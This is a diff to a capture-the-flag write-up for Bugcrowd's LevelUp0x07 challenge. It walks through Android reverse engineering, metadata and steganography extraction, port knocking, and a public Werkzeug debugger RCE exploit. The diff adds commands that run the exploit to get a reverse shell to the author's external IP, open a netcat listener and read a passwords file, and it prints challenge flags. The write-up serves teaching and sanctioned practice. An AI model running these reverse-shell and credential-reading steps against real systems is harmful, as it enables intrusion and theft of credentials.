@@ -24,7 +24,7 @@ The LevelUp0x07 CTF is a web and Android-based capture the flag challenge in whi
 + Each flag varies in difficulty with the first flag being the easiest, and the last being the hardest.
 + If you've found a flag it means you are in the right area and should explore your surroundings to be on the correct path to the next flag.
 
-**CTF link on Bugcrowd:** <https://bugcrowd.com/levelup-ctf/>
+>**CTF link on Bugcrowd:** <https://bugcrowd.com/levelup-ctf/>
 
 
 In the CTF main page, we are introduced to the in-scope target URL <https://07.levelupctf.com/>. So, by checking that URL through the browser, We will find the below page.
@@ -75,6 +75,8 @@ As you can see there is a string resource called **`encrypted_chat_key`** in **`
 
 Now let's use **`d2j-dex2jar`** tool to generate **`jar`** file for the corresponding **`apk`** to view the Android app source code.
 
+**`$ d2j-dex2jar communications.apk`**
+
 ![]({{ 'assets/images/writeups/bugcrowd/levelup0x07ctf-writeup/8.png' | relative_url }})
 
 > **More info about Android App reverse engineering:**<br>
@@ -96,7 +98,7 @@ After sending the request, we get a response with [ROT13](https://en.wikipedia.o
 
 ![]({{ 'assets/images/writeups/bugcrowd/levelup0x07ctf-writeup/10.png' | relative_url }})
 
-After decoding the chat using [rot13.com](https://www.rot13.com), we get the following:
+**After decoding the chat using [rot13.com](https://www.rot13.com), we get the following:**
 
 ```
 agent_nova: meow
@@ -111,6 +113,8 @@ What we got from that chat is usernames of the agents, their profile pictures an
 
 The first thing to check is the photo's metadata using  **`exiftool`** , where we can find the third flag. 
 
+**`$ exiftool 95f86cccd50.png`**
+
 ![]({{ 'assets/images/writeups/bugcrowd/levelup0x07ctf-writeup/11.png' | relative_url }})
 
 >**Third flag: `FLAG{e8606532b027bfd324ea31d1b4f116c2}`**{: style="color: black;" }
@@ -122,7 +126,7 @@ As well, there are some interesting GPS coordinates which we should also check a
 
 GPS coordinates: `37° 43' 58.53" N 122° 30' 8.48" W`
 
-We can search for that place on Google Maps by those coordinates, which is found to be San Francisco Zoo.
+We can search for that place on Google Maps by those coordinates, which is found to be **San Francisco Zoo**.
 
 ![]({{ 'assets/images/writeups/bugcrowd/levelup0x07ctf-writeup/13.png' | relative_url }})
 
@@ -171,6 +175,15 @@ Using Burpsuite's intruder, we can run the attack, which will result in another 
 ![]({{ 'assets/images/writeups/bugcrowd/levelup0x07ctf-writeup/21.png' | relative_url }})
 
 By running **`file`** command on the image, we find that it's a real JPEG image. So by using **`steghide`** tool to check for hidden data embedded in the JPEG image, it asked us for a passphrase. Then, by entering the secret text we got from the **`/radio`** message, we can extract **`console.txt`** file embedded in the image, which has the fifth flag and hints on how to get the sixth flag.
+
+>**To know more about Steganography:**<br>
+>+ <https://en.wikipedia.org/wiki/Steganography><br>
+>+ <http://steghide.sourceforge.net/documentation.php><br>
+>+ <https://0xrick.github.io/lists/stego/><br>
+
+**`$ steghide info agent87.jpg`**<br>
+**`$ steghide extract agent87.jpg`**<br>
+**`$ cat console.txt`**<br>
 
 ![]({{ 'assets/images/writeups/bugcrowd/levelup0x07ctf-writeup/22.png' | relative_url }})
 
@@ -231,6 +244,14 @@ def main():
 main()
 ```
 
+First give execution permission for the script:
+
+**`$ chmod +x knock.py`**
+
+Then, you can run it on your terminal:
+
+**`$ ./knock.py`**
+
 ![]({{ 'assets/images/writeups/bugcrowd/levelup0x07ctf-writeup/23.png' | relative_url }})
 
 Now after we succeeded to open port number **`3389`**, and scanned it using **`nmap`**. We find a running web service on that port called **`Werkzeug`**.
@@ -244,15 +265,26 @@ And by searching for any exploits for it,  we can find one RCE exploit which pro
 > + **Exploit Database:** <https://www.exploit-db.com/exploits/43905><br>
 > + **Rapid7 Vulnerability & Exploit Database:** <https://www.rapid7.com/db/modules/exploit/multi/http/werkzeug_debug_rce><br>
 
+After downloading the exploit from **Exploit Database**, run it on your terminal to display it's usage.
+
+`USAGE: python 43905.py <ip> <port> <your ip> <netcat port>`
+
+**`$ python2 43905.py 07.levelupctf.com 3389 3.13.191.225 13264`**
+
 ![]({{ 'assets/images/writeups/bugcrowd/levelup0x07ctf-writeup/25.png' | relative_url }})
 
 Here I used an awesome tool/service called [**`ngrok`**](https://ngrok.com/) . Which is a good choice if you don't have a VPS with a public IP. It enabled me to forward the exploit traffic to my localhost computer behind NAT.
+
+**`$ nc -lvp 9999`**
 
 ![]({{ 'assets/images/writeups/bugcrowd/levelup0x07ctf-writeup/26.png' | relative_url }})
 
 > **Sixth flag: `FLAG{022d8a7a561a02c371fd7c5ec3e5ea06}`**{: style="color: black;" }
 
 Then, by looking into important files and directories in the linux server, you can find **`passwords.txt`** file in **`/opt`** directory, which contains credentials of the agents for the web portal.
+
+**`$ cd /opt`**<br>
+**`$ cat passwords.txt`**
 
 ![]({{ 'assets/images/writeups/bugcrowd/levelup0x07ctf-writeup/27.png' | relative_url }})
 
